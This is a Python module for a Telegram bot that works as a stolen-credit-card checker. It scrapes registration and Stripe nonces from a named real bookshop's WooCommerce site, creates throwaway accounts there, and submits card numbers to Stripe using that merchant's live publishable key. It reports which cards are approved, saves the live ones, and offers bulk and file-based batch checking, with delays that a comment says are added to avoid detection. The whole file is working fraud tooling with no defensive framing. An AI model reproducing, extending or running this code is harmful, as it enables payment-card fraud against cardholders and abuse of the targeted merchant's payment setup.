# st_commands.py

from telethon import events, Button
import asyncio
import aiohttp
import json
import time
import os
import re
import random
import string

# --- Globals ---
client = None
utils = {}
ACTIVE_MSTXT_PROCESSES = {}

# --- Direct Stripe Check Function (Integrated Raw Logic) ---
async def check_stripe_direct(card):
    """Direct Stripe checkout logic integrated from raw code."""
    try:
        # Parse card details
        parts = card.split("|")
        if len(parts) != 4:
            return {"status": "Error", "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV"}
        
        cc, mm, yyy, cvv = parts
        
        # Create session with proper headers
        headers = {
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }
        
        # Use aiohttp for async requests
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            
            # STEP 1: Get registration nonce
            async with session.get('https://bridgebooksdromore.co.uk/my-account/', headers=headers) as response:
                if response.status != 200:
                    return {"status": "Error", "message": f"Failed to load site: HTTP {response.status}"}
                
                text = await response.text()
                match = re.search(
                    r'id="woocommerce-register-nonce"\s+name="woocommerce-register-nonce"\s+value="([^"]+)"',
                    text
                )
                if not match:
                    return {"status": "Error", "message": "Could not extract registration nonce"}
                rg_nonce = match.group(1)
            
            # STEP 2: Create temporary account
            ml = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            email = f'{ml}@jfffif.uffufu'
            
            registration_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://bridgebooksdromore.co.uk',
                'pragma': 'no-cache',
                'priority': 'u=0, i',
                'referer': 'https://bridgebooksdromore.co.uk/my-account/',
                'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            }
            
            registration_data = {
                'email': email,
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': 'https://bridgebooksdromore.co.uk/',
                'wc_order_attribution_session_start_time': '2025-12-29 08:30:17',
                'wc_order_attribution_session_pages': '3',
                'wc_order_attribution_session_count': '1',
                'woocommerce-register-nonce': rg_nonce,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }
            
            # Create account
            async with session.post('https://bridgebooksdromore.co.uk/my-account/', 
                                   headers=registration_headers, data=registration_data) as response:
                if response.status != 200:
                    return {"status": "Error", "message": f"Account creation failed: HTTP {response.status}"}
            
            # STEP 3: Get Stripe nonce
            payment_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'pragma': 'no-cache',
                'priority': 'u=0, i',
                'referer': 'https://bridgebooksdromore.co.uk/my-account/payment-methods/',
                'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            }
            
            async with session.get('https://bridgebooksdromore.co.uk/my-account/add-payment-method/', 
                                  headers=payment_headers) as response:
                text = await response.text()
                match = re.search(
                    r'"createAndConfirmSetupIntentNonce"\s*:\s*"([a-fA-F0-9]+)"',
                    text
                )
                if not match:
                    return {"status": "Error", "message": "Could not extract Stripe nonce"}
                nonce = match.group(1)
            
            # STEP 4: Create Stripe payment method
            stripe_headers = {
                'accept': 'application/json',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            }
            
            stripe_data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yyy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IN&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbridgebooksdromore.co.uk&time_on_page=359767&client_attribution_metadata[client_session_id]=005427b5-3ad7-40cf-ad6a-36d4a5053dad&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=36bd8d1d-d256-414e-b99c-cb1aa1bfc6f6&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=c617cd8c-e267-4d58-9b42-5378544ac32a055d09&muid=ded6598d-a029-4df0-99a3-4a9803a443a2d5d44e&sid=68c6ccc3-58fb-46fb-a508-26c53944d6f1853325&key=pk_live_51HowwZGALgUMsWpFMI3vbkK4VOi3ucP9ohXHPG9VKPNItGeWTaTWZRMdFjIHUyFlmPLuGr4gvUOnvKueNrPBp6LO00JBZTj5y2&_stripe_version=2024-06-20'
            
            async with session.post('https://api.stripe.com/v1/payment_methods', 
                                   headers=stripe_headers, data=stripe_data) as response:
                stripe_text = await response.text()
                
                if response.status != 200:
                    error_match = re.search(r'"message"\s*:\s*"([^"]+)"', stripe_text)
                    error_msg = error_match.group(1) if error_match else "Stripe API error"
                    return {"status": "Declined", "message": error_msg}
                
                id_match = re.search(r'"id"\s*:\s*"(pm_[^"]+)"', stripe_text)
                if not id_match:
                    return {"status": "Error", "message": "Could not retrieve payment method ID"}
                
                payment_method_id = id_match.group(1)
            
            # STEP 5: Confirm setup with site
            confirm_headers = {
                'accept': '*/*',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://bridgebooksdromore.co.uk',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://bridgebooksdromore.co.uk/my-account/add-payment-method/',
                'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            
            confirm_data = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': payment_method_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce,
            }
            
            async with session.post('https://bridgebooksdromore.co.uk/wp-admin/admin-ajax.php', 
                                   headers=confirm_headers, data=confirm_data) as response:
                result_text = (await response.text()).lower()
                
                # Parse response
                if "succeeded" in result_text:
                    return {"status": "Approved", "message": "New Payment Method Added Successfully ✅"}
                elif "requires_action" in result_text:
                    return {"status": "Declined", "message": "3D Secure Required ❎"}
                elif "security code is incorrect" in result_text:
                    return {"status": "Declined", "message": "Incorrect security code ❌"}
                elif "card was declined" in result_text or "declined" in result_text:
                    return {"status": "Declined", "message": "Your Card was Declined ❌"}
                else:
                    # Try to extract error
                    error_match = re.search(r'"message"\s*:\s*"([^"]+)"', await response.text())
                    error_msg = error_match.group(1) if error_match else "Card Declined"
                    return {"status": "Declined", "message": error_msg}
    
    except asyncio.TimeoutError:
        return {"status": "Error", "message": "Request Timed Out"}
    except aiohttp.ClientError as e:
        return {"status": "Error", "message": f"Network Error: {str(e)}"}
    except Exception as e:
        return {"status": "Error", "message": f"Processing Error: {str(e)}"}

# --- Core API Function (Now using direct logic) ---
async def check_st_api(card):
    """Uses direct Stripe checkout logic instead of external API."""
    return await check_stripe_direct(card)

# --- Single Check (/st) ---
async def process_st_card(event):
    """Processes a single card check for /st command."""
    card = utils['extract_card'](event.raw_text)
    if not card and event.is_reply:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            card = utils['extract_card'](replied_msg.text)
    
    if not card:
        return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩 ➜ /𝙨𝙩 4111...|12|25|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙧𝙚𝙙𝙞𝙩 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤")

    loading_msg = await event.reply("🍳")
    start_time = time.time()

    res = await check_st_api(card)
    elapsed_time = round(time.time() - start_time, 2)
    
    # Get BIN info (assuming this utility exists)
    if 'get_bin_info' in utils:
        brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
    else:
        # Fallback BIN info
        brand, bin_type, level, bank, country, flag = "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", "🏴"
    
    status = res.get("status")
    if status == "Approved":
        status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
        if 'save_approved_card' in utils:
            await utils['save_approved_card'](card, "APPROVED (ST)", res.get('message'), "Stripe Direct", "N/A")
    elif status == "Declined":
        status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
    else: # Handles "Error"
        status_header = "𝙀𝙍𝙍𝙊𝙍 ⚠️"

    msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Stripe Direct
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {res.get('message')}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝗸 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"""
    
    await loading_msg.delete()
    await event.reply(msg)

# --- Mass Check (/mst) with Batch Processing ---
async def process_mst_cards(event, cards):
    """Processes multiple cards for /mst command using concurrent batches."""
    sent_msg = await event.reply(f"```𝙎𝙤𝙢𝙚𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 {len(cards)} 𝙏𝙤𝙩𝙖𝙡.```")
    
    batch_size = 5  # Reduced for direct Stripe checks (they're heavier)
    for i in range(0, len(cards), batch_size):
        batch = cards[i:i+batch_size]
        tasks = [check_st_api(card) for card in batch]
        results = await asyncio.gather(*tasks)

        for card, res in zip(batch, results):
            status = res.get("status")
            
            if status == "Approved":
                status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                if 'save_approved_card' in utils:
                    await utils['save_approved_card'](card, "APPROVED (ST)", res.get('message'), "Stripe Direct", "N/A")
            elif status == "Declined":
                status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
            else:
                status_header = "𝙀𝙍𝙍𝙊𝙍 ⚠️"
            
            if 'get_bin_info' in utils:
                brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
            else:
                brand, bin_type, level, bank, country, flag = "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", "🏴"

            card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Stripe Direct
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {res.get('message')}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```"""
            
            await event.reply(card_msg)
            await asyncio.sleep(0.5)  # Increased delay to avoid detection
        
    await sent_msg.edit(f"```✅ 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚! 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙 {len(cards)} 𝙘𝙖𝙧𝙙𝙨.```")

# --- Mass Text File Check (/mstxt) ---
async def process_mstxt_cards(event, cards):
    """Processes cards from a text file for /mstxt command."""
    user_id = event.sender_id
    total = len(cards)
    checked, approved, declined = 0, 0, 0
    status_msg = await event.reply("```𝙎𝙤𝙢𝙚𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳```")
    
    try:
        batch_size = 3  # Small batches for direct Stripe
        for i in range(0, len(cards), batch_size):
            if user_id not in ACTIVE_MSTXT_PROCESSES: break
            
            batch = cards[i:i+batch_size]
            tasks = [check_st_api(card) for card in batch]
            results = await asyncio.gather(*tasks)

            for card, res in zip(batch, results):
                if user_id not in ACTIVE_MSTXT_PROCESSES: break
                
                checked += 1
                status = res.get("status")
                
                if status == "Approved":
                    approved += 1
                    if 'save_approved_card' in utils:
                        await utils['save_approved_card'](card, "APPROVED (ST)", res.get('message'), "Stripe Direct", "N/A")
                    
                    if 'get_bin_info' in utils:
                        brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
                    else:
                        brand, bin_type, level, bank, country, flag = "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", "🏴"
                    
                    card_msg = f"""𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Stripe Direct
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {res.get('message')}

```𝗕𝗜𝙉 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```"""
                    await event.reply(card_msg)

                elif status == "Declined":
                    declined += 1
                
                # Update status message with buttons
                buttons = [
                    [Button.inline(f"𝗖𝘂𝗿𝗿𝗲𝗻𝘁 ➜ {card[:12]}****", b"none")],
                    [Button.inline(f"𝙎𝙩𝙖𝙩𝙪𝙨 ➜ {res.get('message', '')[:25]}...", b"none")],
                    [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] ✅", b"none")],
                    [Button.inline(f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ➜ [ {declined} ] ❌", b"none")],
                    [Button.inline(f"𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ [{checked}/{total}] 🔥", b"none")],
                    [Button.inline("⛔ 𝙎𝙩𝙤𝙥", f"stop_st_mstxt:{user_id}".encode())]
                ]
                try:
                    await status_msg.edit("```𝘾𝙤𝙤𝙠𝙞ਂ𝓰 🍳 𝘾𝘾𝙨 𝙊𝙣𝙚 𝙗𝙮 𝙊𝙣𝙚...```", buttons=buttons)
                except: pass
            await asyncio.sleep(1)  # Increased delay between batches

        final_caption = f"""✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!

𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ✅ : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 🔥 : {total}
"""
        await status_msg.edit(final_caption, buttons=None)

    finally:
        ACTIVE_MSTXT_PROCESSES.pop(user_id, None)

# --- Event Handler Functions ---
async def st_command(event):
    can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
    if not can_access:
        message, buttons = (utils['banned_user_message'](), None) if access_type == "banned" else utils['access_denied_message_with_button']()
        return await event.reply(message, buttons=buttons)
    asyncio.create_task(process_st_card(event))

async def mst_command(event):
    can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
    if not can_access:
        message, buttons = (utils['banned_user_message'](), None) if access_type == "banned" else utils['access_denied_message_with_button']()
        return await event.reply(message, buttons=buttons)
    
    text_to_check = event.raw_text
    if event.is_reply:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            text_to_check = replied_msg.text

    cards = utils['extract_all_cards'](text_to_check)
    
    if not cards:
        return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩. /𝙢𝙨𝙩 5414...|01|25|123 5414...|02|26|321")
    
    limit = 15  # Reduced limit for direct Stripe
    if len(cards) > limit:
        original_count = len(cards)
        cards = cards[:limit]
        await event.reply(f"⚠️ 𝙊𝙣𝙡𝙮 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙞𝙧𝙨𝙩 {limit} 𝙘𝙖𝙧𝙙𝙨 𝙤𝙪𝙩 𝙤𝙛 {original_count}. 𝙇𝙞𝙢𝙞𝙩 𝙞𝙨 {limit}.")
        
    asyncio.create_task(process_mst_cards(event, cards))

async def mstxt_command(event):
    can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
    if not can_access:
        message, buttons = (utils['banned_user_message'](), None) if access_type == "banned" else utils['access_denied_message_with_button']()
        return await event.reply(message, buttons=buttons)
    
    user_id = event.sender_id
    if user_id in ACTIVE_MSTXT_PROCESSES:
        return await event.reply("```𝙔𝙤𝙪𝙧 𝘾𝘾 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚```")
        
    if not event.is_reply:
        return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 .𝙩𝙭𝙩 𝙛𝙞𝙡𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙨𝙩𝙭𝙩```")
    
    replied_msg = await event.get_reply_message()
    if not replied_msg or not replied_msg.document:
        return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 .𝙩xt 𝙛𝙞𝙡𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙨𝙩𝙭𝙩```")
    
    file_path = None
    try:
        file_path = await replied_msg.download_media()
        with open(file_path, "r", encoding='utf-8', errors='ignore') as f:
            lines = f.read().splitlines()
    except Exception as e:
        return await event.reply(f"Error reading file: {e}")
    finally:
        if file_path and os.path.exists(file_path):
            os.remove(file_path)

    cards = [line for line in lines if re.match(r'\d{12,16}[|\s/]*\d{1,2}[|\s/]*\d{2,4}[|\s/]*\d{3,4}', line)]
    if not cards:
        return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲")
        
    cc_limit = utils['get_cc_limit'](access_type, user_id) if 'get_cc_limit' in utils else 25
    original_count = len(cards)
    if original_count > cc_limit:
        cards = cards[:cc_limit]
        await event.reply(f"⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 𝙤𝙪𝙩 𝙤𝙛 {original_count} (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩).")
    
    ACTIVE_MSTXT_PROCESSES[user_id] = True
    asyncio.create_task(process_mstxt_cards(event, cards))

async def stop_mstxt_callback(event):
    """Callback for the stop button in /mstxt."""
    try:
        process_user_id = int(event.pattern_match.group(1).decode())
        clicking_user_id = event.sender_id
        
        can_stop = (clicking_user_id == process_user_id) or (clicking_user_id in utils['ADMIN_ID'])
        if not can_stop:
            return await event.answer("❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙨𝙩𝙤𝙥 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨!", alert=True)

        if process_user_id in ACTIVE_MSTXT_PROCESSES:
            ACTIVE_MSTXT_PROCESSES.pop(process_user_id)
            await event.answer("⛔ 𝘾𝘾 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙!", alert=True)
            try:
                await event.edit(event.message.text + "\n\n-- CHECKING STOPPED BY USER --", buttons=None)
            except: pass
        else:
            await event.answer("❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙛𝙤𝙪𝙣𝙙!", alert=True)
    except Exception as e:
        await event.answer(f"Error: {e}", alert=True)

# --- Registration Function ---
def register_handlers(_client, _utils):
    """Registers all the handlers and utilities from the main file."""
    global client, utils
    client = _client
    utils = _utils

    client.on(events.NewMessage(pattern=r'(?i)^[/.]st'))(st_command)
    client.on(events.NewMessage(pattern=r'(?i)^[/.]mst'))(mst_command)
    client.on(events.NewMessage(pattern=r'(?i)^[/.]mstxt$'))(mstxt_command)
    client.on(events.CallbackQuery(pattern=rb"stop_st_mstxt:(\d+)"))(stop_mstxt_callback)
    print("✅ Successfully registered ST, MST, MSTXT commands with DIRECT Stripe integration.")